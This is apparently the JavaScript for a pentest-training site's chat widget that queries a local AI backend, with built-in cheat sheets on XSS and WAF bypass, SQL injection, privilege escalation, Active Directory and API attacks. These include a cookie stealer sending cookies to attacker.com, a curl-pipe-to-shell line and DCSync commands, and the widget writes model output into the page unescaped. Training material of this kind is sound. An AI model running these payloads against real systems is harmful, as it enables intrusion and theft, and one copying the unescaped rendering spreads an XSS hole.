/* ==================== AI SECURITY ASSISTANT 🤖🛡️ ==================== */
/* Intelligent Security Testing Assistant with Real-Time Analysis */

window.AISecurityAssistant = {
    // --- STATE ---
    isOpen: false,
    messages: [],
    context: null,
    isLoading: false,
    sessionId: localStorage.getItem('ai_session_id') || ('sess_' + Math.random().toString(36).substr(2, 9)),

    // --- AI PROMPTS FOR SECURITY ---
    securityPrompts: {
        xss: `You are an expert XSS security researcher. Help analyze and craft XSS payloads. Provide WAF bypass techniques, context-specific payloads, and exploitation strategies.`,
        sqli: `You are an expert SQL injection specialist. Help with SQLi detection, exploitation, and database enumeration. Provide payloads for different databases (MySQL, MSSQL, PostgreSQL, Oracle).`,
        recon: `You are an expert in reconnaissance and OSINT. Help with subdomain enumeration, technology fingerprinting, and attack surface mapping.`,
        privesc: `You are an expert in privilege escalation for both Linux and Windows. Help identify misconfigurations and provide exploitation techniques.`,
        api: `You are an API security expert. Help identify OWASP API Top 10 vulnerabilities, test authentication mechanisms, and exploit API flaws.`,
        ad: `You are an Active Directory security expert. Help with AD enumeration, Kerberos attacks, lateral movement, and domain dominance techniques.`,
        general: `You are a senior penetration tester and security researcher. Help with vulnerability assessment, exploitation, and security testing methodology.`
    },

    // --- QUICK ACTIONS ---
    quickActions: [
        { label: 'Analyze URL', icon: 'fa-link', action: 'analyzeUrl' },
        { label: 'Generate Payload', icon: 'fa-code', action: 'generatePayload' },
        { label: 'Explain Vuln', icon: 'fa-book', action: 'explainVuln' },
        { label: 'Bypass WAF', icon: 'fa-shield-alt', action: 'bypassWaf' },
        { label: 'Recon Help', icon: 'fa-search', action: 'reconHelp' },
        { label: 'PrivEsc Tips', icon: 'fa-crown', action: 'privescTips' },
        { label: 'Code Review', icon: 'fa-bug', action: 'codeReview' }
    ],

    // --- INIT ---
    init() {
        if (!localStorage.getItem('ai_session_id')) {
            localStorage.setItem('ai_session_id', this.sessionId);
        }
        this.injectStyles();
        this.injectWidget();
        this.bindEvents();
    },

    // --- INJECT WIDGET ---
    injectWidget() {
        const widget = document.createElement('div');
        widget.id = 'ai-assistant-widget';
        widget.innerHTML = `
            <div class="ai-toggle" onclick="AISecurityAssistant.toggle()">
                <i class="fas fa-robot"></i>
                <span class="ai-badge">AI</span>
            </div>
            <div class="ai-panel ${this.isOpen ? 'open' : ''}">
                <div class="ai-header">
                    <div class="ai-title">
                        <i class="fas fa-robot"></i>
                        <span>AI Security Assistant</span>
                    </div>
                    <button onclick="AISecurityAssistant.toggle()"><i class="fas fa-times"></i></button>
                </div>
                <div class="ai-quick-actions">
                    ${this.quickActions.map(a => `
                        <button onclick="AISecurityAssistant.quickAction('${a.action}')">
                            <i class="fas ${a.icon}"></i> ${a.label}
                        </button>
                    `).join('')}
                </div>
                <div class="ai-messages" id="ai-messages">
                    ${this.messages.length === 0 ?
                `<div class="ai-welcome">
                            <i class="fas fa-shield-alt"></i>
                            <h3>Security AI Assistant</h3>
                            <p>Ask me anything about:</p>
                            <ul>
                                <li>XSS, SQLi, SSRF payloads</li>
                                <li>Privilege escalation</li>
                                <li>API security testing</li>
                                <li>Active Directory attacks</li>
                                <li>Bug bounty methodology</li>
                            </ul>
                        </div>` :
                this.messages.map(m => this.renderMessage(m)).join('')
            }
                </div>
                <div class="ai-input-area">
                    <input type="text" id="ai-input" placeholder="Ask about security testing..." 
                           onkeypress="if(event.key==='Enter')AISecurityAssistant.send()">
                    <button onclick="AISecurityAssistant.send()">
                        <i class="fas fa-paper-plane"></i>
                    </button>
                </div>
            </div>
        `;
        document.body.appendChild(widget);
    },

    renderMessage(msg) {
        return `
            <div class="ai-message ${msg.role}">
                <div class="msg-icon">
                    <i class="fas ${msg.role === 'user' ? 'fa-user' : 'fa-robot'}"></i>
                </div>
                <div class="msg-content">${this.formatMessage(msg.content)}</div>
            </div>
        `;
    },

    formatMessage(content) {
        // Format code blocks
        content = content.replace(/```(\w+)?\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>');
        content = content.replace(/`([^`]+)`/g, '<code>$1</code>');
        // Format bold
        content = content.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
        // Format lists
        content = content.replace(/^- (.+)$/gm, '<li>$1</li>');
        content = content.replace(/(<li>.*<\/li>)/gs, '<ul>$1</ul>');
        // Format line breaks
        content = content.replace(/\n/g, '<br>');
        return content;
    },

    // --- TOGGLE ---
    toggle() {
        this.isOpen = !this.isOpen;
        const panel = document.querySelector('.ai-panel');
        if (panel) panel.classList.toggle('open', this.isOpen);
    },

    clearMemory() {
        if (confirm('Clear conversation memory? This cannot be undone.')) {
            fetch('http://localhost:5005/api/ai/clear', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: this.sessionId })
            }).then(() => {
                this.messages = [];
                this.updateMessages();
                this.addMessage('assistant', 'Memory cleared. How can I help you now?');
            });
        }
    },

    // --- SEND MESSAGE ---
    async send() {
        const input = document.getElementById('ai-input');
        const message = input.value.trim();
        if (!message || this.isLoading) return;

        input.value = '';
        this.addMessage('user', message);
        this.showLoading();

        try {
            await this.getStreamingResponse(message);
        } catch (error) {
            this.hideLoading();
            this.addMessage('assistant', 'Error: AI Core offline. Ensure Ollama is running.');
        }
    },

    // --- STREAMING RESPONSE ---
    async getStreamingResponse(message, context = null, targetElementId = 'ai-messages') {
        this.isLoading = true;

        // Add empty assistant bubble
        const assistantMsgId = 'msg-' + Date.now();
        const container = document.getElementById(targetElementId);
        if (container) {
            container.innerHTML += `
                <div class="ai-message assistant" id="${assistantMsgId}">
                    <div class="msg-icon"><i class="fas fa-robot"></i></div>
                    <div class="msg-content"></div>
                </div>
            `;
            container.scrollTop = container.scrollHeight;
        }

        const msgContent = document.querySelector(`#${assistantMsgId} .msg-content`);

        try {
            const response = await fetch('http://localhost:5005/api/ai/ask', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userMessage: message,
                    context: context || this.detectContext(),
                    stream: true,
                    sessionId: this.sessionId
                })
            });

            if (!response.ok) throw new Error('Middleware unreachable');

            const reader = response.body.getReader();
            const decoder = new TextDecoder();
            let fullText = '';

            while (true) {
                const { done, value } = await reader.read();
                if (done) break;
                const chunk = decoder.decode(value);

                // Note: If using Ollama directly or our middleware SSE
                // We parse the buffer here.
                fullText += chunk;
                msgContent.innerHTML = this.formatMessage(fullText);
                container.scrollTop = container.scrollHeight;
            }

            this.messages.push({ role: 'assistant', content: fullText });
            this.hideLoading();

        } catch (error) {
            console.error('AI Error:', error);
            if (msgContent) msgContent.innerHTML = '<span class="text-danger">The Brain is Currently Offline.</span>';
            this.hideLoading();
        }
    },

    // --- QUICK ACTIONS ---
    async quickAction(action) {
        let userPrompt = '';
        switch (action) {
            case 'analyzeUrl':
                const url = window.prompt('Enter URL to analyze:');
                if (url) userPrompt = `Analyze this URL for potential vulnerabilities: ${url}. Check for XSS, SQLi, SSRF, open redirect, and other common web vulnerabilities.`;
                break;
            case 'generatePayload':
                const type = window.prompt('Payload type (xss/sqli/ssti/lfi/cmd):');
                const context = window.prompt('Context (e.g., input field, URL parameter, JSON body):');
                if (type) userPrompt = `Generate a ${type} payload for testing in the following context: ${context}. Include WAF bypass variations.`;
                break;
            case 'explainVuln':
                const vuln = window.prompt('Vulnerability name (e.g., XSS, SSRF, IDOR):');
                if (vuln) userPrompt = `Explain ${vuln} vulnerability in detail. Include: how it works, how to find it, how to exploit it, and remediation.`;
                break;
            case 'bypassWaf':
                const payload = window.prompt('Your blocked payload:');
                if (payload) userPrompt = `My payload "${payload}" is being blocked by WAF. Suggest bypass techniques and alternative payloads.`;
                break;
            case 'reconHelp':
                const target = window.prompt('Target domain:');
                if (target) userPrompt = `Provide a comprehensive reconnaissance plan for ${target}. Include subdomain enumeration, port scanning, technology fingerprinting, and content discovery commands.`;
                break;
            case 'privescTips':
                const os = window.prompt('Operating system (linux/windows):');
                if (os) userPrompt = `Provide a complete ${os} privilege escalation checklist with commands and techniques.`;
                break;
            case 'codeReview':
                const snippet = window.prompt('Paste code snippet to analyze:');
                if (snippet) userPrompt = `Analyze the following code for security vulnerabilities. Identify issues like SQLi, XSS, RCE, or logic flaws and provide secure fixes:\n\n${snippet}`;
                break;
        }

        if (userPrompt) {
            document.getElementById('ai-input').value = userPrompt;
            this.send();
        }
    },

    // --- DYNAMIC HINT (GRAVITY) ---
    async askForHint(labId, userQuestion) {
        if (!this.isOpen) this.toggle();

        const prompt = `I am working on lab "${labId}". ${userQuestion || "I need a hint."}`;
        this.addMessage('user', prompt);
        this.showLoading();

        try {
            const response = await fetch('http://localhost:5005/api/ai/hint', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ labId, userQuestion })
            });

            if (!response.ok) throw new Error('AI Hint Service error');
            const data = await response.json();

            this.hideLoading();
            this.addMessage('assistant', data.hint);
        } catch (error) {
            this.hideLoading();
            this.addMessage('assistant', "I couldn't reach the lab intelligence module. Is the backend running?");
        }
    },

    // --- CONTEXT SENSITIVE METHODS ---
    showDebugButton(command, term) {
        if (!this.isOpen) this.toggle();
        this.addMessage('assistant', `I noticed you're having trouble with the command \`${command}\`. Would you like me to explain how to use it or suggest an alternative?`);
    },

    explainText(text) {
        if (!this.isOpen) this.toggle();
        const prompt = `Please explain this technical concept simply: "${text}"`;
        this.addMessage('user', prompt);
        this.getStreamingResponse(prompt, { feature: 'smart-tutor' });
    },

    getXSSHelp(msg) {
        if (msg.includes('bypass') || msg.includes('waf')) {
            return `**XSS WAF Bypass Techniques:**

1. **Encoding Bypass:**
\`\`\`
<img src=x onerror=alert\`1\`>
<svg/onload=alert(1)>
<script>alert(String.fromCharCode(88,83,83))</script>
\`\`\`

2. **Case Mixing:**
\`\`\`
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x OnErRoR=alert(1)>
\`\`\`

3. **HTML Encoding:**
\`\`\`
&lt;script&gt;alert(1)&lt;/script&gt;
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
\`\`\`

4. **Null Bytes & Comments:**
\`\`\`
<scr<script>ipt>alert(1)</script>
<img src=x onerror/*test*/=alert(1)>
\`\`\``;
        }
        return `**XSS Testing Guide:**

**1. Basic Payloads:**
\`\`\`
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
\`\`\`

**2. Finding XSS:**
- Test all input fields
- Check URL parameters
- Look at DOM manipulation
- Test file upload names

**3. Tools:**
- Dalfox for automated testing
- XSSStrike for payload generation
- Burp Suite for manual testing

**4. Impact Demonstration:**
\`\`\`javascript
// Cookie Stealer
new Image().src="http://attacker.com/?c="+document.cookie
\`\`\``;
    },

    getSQLiHelp(msg) {
        return `**SQL Injection Testing:**

**1. Detection:**
\`\`\`
' OR '1'='1
" OR "1"="1
' AND SLEEP(5)--
\`\`\`

**2. Union Based:**
\`\`\`
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--
\`\`\`

**3. Error Based:**
\`\`\`
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
\`\`\`

**4. Blind SQLi:**
\`\`\`
' AND SUBSTRING(database(),1,1)='a'--
' AND IF(1=1,SLEEP(5),0)--
\`\`\`

**5. SQLMap Command:**
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --dbs --batch
\`\`\``;
    },

    getPrivEscHelp(msg) {
        if (msg.includes('linux')) {
            return `**Linux Privilege Escalation:**

**1. Quick Wins:**
\`\`\`bash
sudo -l                    # Check sudo permissions
find / -perm -4000 2>/dev/null  # Find SUID binaries
cat /etc/crontab           # Check cron jobs
getcap -r / 2>/dev/null    # Check capabilities
\`\`\`

**2. SUID Exploitation:**
\`\`\`bash
# GTFOBins reference
find . -exec /bin/sh -p \\; -quit
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
\`\`\`

**3. Kernel Exploits:**
\`\`\`bash
uname -a                   # Get kernel version
searchsploit linux kernel  # Find exploits
\`\`\`

**4. Automated Enumeration:**
\`\`\`bash
curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
\`\`\``;
        }
        return `**Windows Privilege Escalation:**

**1. Quick Wins:**
\`\`\`cmd
whoami /priv              # Check privileges
systeminfo                 # System info
wmic service get name,pathname  # Unquoted paths
\`\`\`

**2. Token Impersonation:**
\`\`\`
JuicyPotato.exe -l 1337 -p cmd.exe -t *
PrintSpoofer.exe -i -c cmd
\`\`\`

**3. UAC Bypass:**
\`\`\`powershell
# Fodhelper bypass
reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "cmd.exe" /f
fodhelper
\`\`\`

**4. Automated Enumeration:**
\`\`\`
winPEASany.exe
PowerUp.ps1
\`\`\``;
    },

    getReconHelp(msg) {
        return `**Reconnaissance Methodology:**

**1. Subdomain Enumeration:**
\`\`\`bash
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com
\`\`\`

**2. Alive Hosts:**
\`\`\`bash
cat subs.txt | httpx -silent -o alive.txt
\`\`\`

**3. Port Scanning:**
\`\`\`bash
nmap -sV -sC -T4 -iL alive.txt -oA scan
\`\`\`

**4. Content Discovery:**
\`\`\`bash
ffuf -u https://target.com/FUZZ -w wordlist.txt
\`\`\`

**5. Parameter Discovery:**
\`\`\`bash
arjun -u https://target.com/page
paramspider -d target.com
\`\`\`

**6. JavaScript Analysis:**
\`\`\`bash
echo target.com | gau | grep '\\.js$' > js_files.txt
\`\`\``;
    },

    getAPIHelp(msg) {
        return `**API Security Testing:**

**1. JWT Attacks:**
\`\`\`
# None algorithm
{"alg":"none","typ":"JWT"}

# Crack weak secret
hashcat -m 16500 jwt.txt wordlist.txt
\`\`\`

**2. BOLA/IDOR:**
\`\`\`
GET /api/users/1  -> GET /api/users/2
Change user IDs in requests
\`\`\`

**3. Mass Assignment:**
\`\`\`json
{"name":"test","isAdmin":true,"role":"admin"}
\`\`\`

**4. GraphQL:**
\`\`\`
{__schema{types{name,fields{name}}}}
\`\`\`

**5. Rate Limiting:**
Test brute force on login/OTP endpoints`;
    },

    getADHelp(msg) {
        return `**Active Directory Attacks:**

**1. Enumeration:**
\`\`\`powershell
Get-ADUser -Filter * -Properties *
Get-ADGroupMember "Domain Admins"
\`\`\`

**2. Kerberoasting:**
\`\`\`bash
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request
hashcat -m 13100 hash.txt wordlist.txt
\`\`\`

**3. AS-REP Roasting:**
\`\`\`bash
GetNPUsers.py domain/ -usersfile users.txt -no-pass
\`\`\`

**4. Pass the Hash:**
\`\`\`bash
psexec.py domain/user@target -hashes :NTLM_HASH
\`\`\`

**5. DCSync:**
\`\`\`
lsadump::dcsync /domain:domain.local /user:Administrator
\`\`\``;
    },

    getGeneralHelp(msg) {
        return `**Security Testing Resources:**

I can help you with:
- **Web Vulnerabilities:** XSS, SQLi, SSRF, SSTI, LFI
- **Privilege Escalation:** Linux & Windows techniques
- **API Security:** JWT, GraphQL, OWASP API Top 10
- **Active Directory:** Kerberos attacks, lateral movement
- **Reconnaissance:** Subdomain enum, content discovery

**Try asking:**
- "How to bypass WAF for XSS?"
- "Generate SQLi payload for MySQL"
- "Linux privesc checklist"
- "Enumerate Active Directory"

**Useful Commands:**
\`\`\`bash
# Quick recon
subfinder -d target.com | httpx | nuclei

# Vuln scanning
nuclei -l urls.txt -t ~/nuclei-templates/
\`\`\``;
    },

    // --- CONTEXT DETECTION ---
    detectContext() {
        // Try to get specific lab context
        if (window.roomViewer && window.roomViewer.currentRoomData) {
            return `User is working on Lab: "${window.roomViewer.currentRoomData.title}" (Difficulty: ${window.roomViewer.currentRoomData.difficulty}).`;
        }

        const hash = window.location.hash.replace('#', '') || 'home';
        if (hash.startsWith('learn/')) return `User is reading learning module: ${hash.split('/')[1]}`;
        if (hash.startsWith('ctf/')) return `User is solving CTF challenge: ${hash.split('/')[1]}`;

        return `User is on page: ${hash}`;
    },

    // --- PROACTIVE ASSISTANCE ---
    proactiveHint() {
        if (localStorage.getItem('ai_proactive_muted') === 'true') return;

        // Example trigger: If user spends 5 mins on a hard lab without solving
        // This is a placeholder for more complex logic
        const context = this.detectContext();
        if (context.includes('Difficulty: Hard') || context.includes('Difficulty: Insane')) {
            setTimeout(() => {
                if (this.messages.length === 0) {
                    this.addMessage('assistant', "I see you're tackling a difficult challenge. Remember, I'm here if you get stuck! Just click 'Hints' or ask me directly.");
                }
            }, 10000); // 10s delay for demo
        }
    },

    // --- HELPERS ---
    addMessage(role, content) {
        this.messages.push({ role, content });
        this.updateMessages();
    },

    updateMessages() {
        const container = document.getElementById('ai-messages');
        if (container) {
            container.innerHTML = this.messages.map(m => this.renderMessage(m)).join('');
            container.scrollTop = container.scrollHeight;
        }
    },

    showLoading() {
        this.isLoading = true;
        const container = document.getElementById('ai-messages');
        if (container) {
            container.innerHTML += `<div class="ai-loading"><i class="fas fa-spinner fa-spin"></i> Thinking...</div>`;
            container.scrollTop = container.scrollHeight;
        }
    },

    hideLoading() {
        this.isLoading = false;
        const loading = document.querySelector('.ai-loading');
        if (loading) loading.remove();
    },

    // --- EVENTS ---
    bindEvents() {
        // Escape to close
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && this.isOpen) this.toggle();
        });

        // Smart Selection Listener (Explain Code)
        document.addEventListener('mouseup', (e) => {
            const selection = window.getSelection().toString().trim();
            if (selection.length > 5 && selection.length < 1000) {
                // Check if selection is inside code block
                const node = window.getSelection().anchorNode.parentElement;
                if (node && (node.tagName === 'CODE' || node.tagName === 'PRE' || node.closest('.prism-live') || node.closest('.code-snippet'))) {
                    this.showExplainButton(e.clientX, e.clientY, selection);
                }
            } else {
                this.hideExplainButton();
            }
        });

        // Hide explain button on scroll
        window.addEventListener('scroll', () => this.hideExplainButton());
    },

    // --- SMART EXPLAIN UI ---
    showExplainButton(x, y, text) {
        this.hideExplainButton(); // Clear existing
        const btn = document.createElement('div');
        btn.id = 'ai-explain-btn';
        btn.innerHTML = '<i class="fas fa-magic"></i> Explain Code';
        btn.style.cssText = `
            position: fixed; top: ${y - 40}px; left: ${x}px;
            background: #8b5cf6; color: white; padding: 5px 10px;
            border-radius: 5px; cursor: pointer; z-index: 10001;
            font-size: 12px; font-weight: bold; box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            animation: fadeIn 0.2s;
        `;
        btn.onclick = () => {
            this.explainText(text);
            this.hideExplainButton();
            window.getSelection().removeAllRanges();
        };
        document.body.appendChild(btn);
    },

    hideExplainButton() {
        const btn = document.getElementById('ai-explain-btn');
        if (btn) btn.remove();
    },

    // --- STYLES ---
    injectStyles() {
        const style = document.createElement('style');
        style.textContent = `
            #ai-assistant-widget { position: fixed; bottom: 20px; right: 20px; z-index: 10000; font-family: 'Segoe UI', sans-serif; }
            
            .ai-toggle { width: 60px; height: 60px; background: linear-gradient(135deg, #8b5cf6 0%, #6366f1 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 20px rgba(139,92,246,0.4); transition: transform 0.3s, box-shadow 0.3s; }
            .ai-toggle:hover { transform: scale(1.1); box-shadow: 0 6px 30px rgba(139,92,246,0.6); }
            .ai-toggle i { color: white; font-size: 1.5rem; }
            .ai-badge { position: absolute; top: -5px; right: -5px; background: #10b981; color: white; padding: 2px 6px; border-radius: 10px; font-size: 0.65rem; font-weight: bold; }

            .ai-panel { position: absolute; bottom: 70px; right: 0; width: 420px; max-height: 600px; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); display: none; flex-direction: column; overflow: hidden; border: 1px solid rgba(139,92,246,0.3); }
            .ai-panel.open { display: flex; animation: slideUp 0.3s ease; }
            @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

            .ai-header { display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; background: rgba(0,0,0,0.3); border-bottom: 1px solid rgba(255,255,255,0.1); }
            .ai-title { display: flex; align-items: center; gap: 10px; color: #8b5cf6; font-weight: 600; }
            .ai-header button { background: none; border: none; color: #888; cursor: pointer; font-size: 1.1rem; }

            .ai-quick-actions { display: flex; flex-wrap: wrap; gap: 8px; padding: 12px 15px; background: rgba(0,0,0,0.2); border-bottom: 1px solid rgba(255,255,255,0.05); }
            .ai-quick-actions button { padding: 6px 12px; background: rgba(139,92,246,0.15); border: 1px solid rgba(139,92,246,0.3); border-radius: 15px; color: #a78bfa; cursor: pointer; font-size: 0.75rem; transition: 0.2s; }
            .ai-quick-actions button:hover { background: rgba(139,92,246,0.3); color: #fff; }

            .ai-messages { flex: 1; overflow-y: auto; padding: 15px; min-height: 300px; max-height: 400px; }
            .ai-welcome { text-align: center; padding: 30px 20px; color: #888; }
            .ai-welcome i { font-size: 3rem; color: #8b5cf6; margin-bottom: 15px; }
            .ai-welcome h3 { color: #fff; margin: 0 0 10px; }
            .ai-welcome ul { text-align: left; padding-left: 20px; margin-top: 15px; }
            .ai-welcome li { margin: 5px 0; }

            .ai-message { display: flex; gap: 10px; margin-bottom: 15px; }
            .ai-message.user { flex-direction: row-reverse; }
            .msg-icon { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
            .ai-message.user .msg-icon { background: #3b82f6; }
            .ai-message.assistant .msg-icon { background: #8b5cf6; }
            .msg-icon i { color: white; font-size: 0.85rem; }
            .msg-content { background: rgba(255,255,255,0.05); padding: 12px 15px; border-radius: 12px; max-width: 85%; color: #e0e0e0; font-size: 0.9rem; line-height: 1.5; }
            .ai-message.user .msg-content { background: rgba(59,130,246,0.2); }
            .msg-content code { background: rgba(0,0,0,0.4); padding: 2px 6px; border-radius: 4px; color: #2ecc71; font-family: monospace; }
            .msg-content pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 8px; overflow-x: auto; margin: 10px 0; }
            .msg-content pre code { background: none; padding: 0; }
            .msg-content ul { margin: 10px 0; padding-left: 20px; }

            .ai-loading { text-align: center; padding: 15px; color: #8b5cf6; }

            .ai-input-area { display: flex; gap: 10px; padding: 15px; background: rgba(0,0,0,0.3); border-top: 1px solid rgba(255,255,255,0.1); }
            .ai-input-area input { flex: 1; padding: 12px 15px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: #fff; font-size: 0.9rem; }
            .ai-input-area input:focus { outline: none; border-color: #8b5cf6; }
            .ai-input-area button { padding: 12px 18px; background: #8b5cf6; border: none; border-radius: 10px; color: #fff; cursor: pointer; transition: 0.2s; }
            .ai-input-area button:hover { background: #7c3aed; }

            @media (max-width: 500px) {
                .ai-panel { width: calc(100vw - 40px); right: -10px; }
            }

            /* Smart Tutor Styles */
            .ai-explain-p { position: relative; padding-right: 30px !important; }
            .ai-explain-trigger { 
                position: absolute; right: 5px; top: 50%; transform: translateY(-50%);
                color: #f59e0b; cursor: pointer; opacity: 0.4; transition: 0.3s; font-size: 0.8rem;
            }
            .ai-explain-p:hover .ai-explain-trigger { opacity: 1; }
            .ai-tutor-enabled i { cursor: pointer; }
        `;
        document.head.appendChild(style);
    }
};

// Auto-init when DOM ready
document.addEventListener('DOMContentLoaded', () => {
    AISecurityAssistant.init();
});

// Also init immediately if DOM already loaded
if (document.readyState !== 'loading') {
    AISecurityAssistant.init();
}
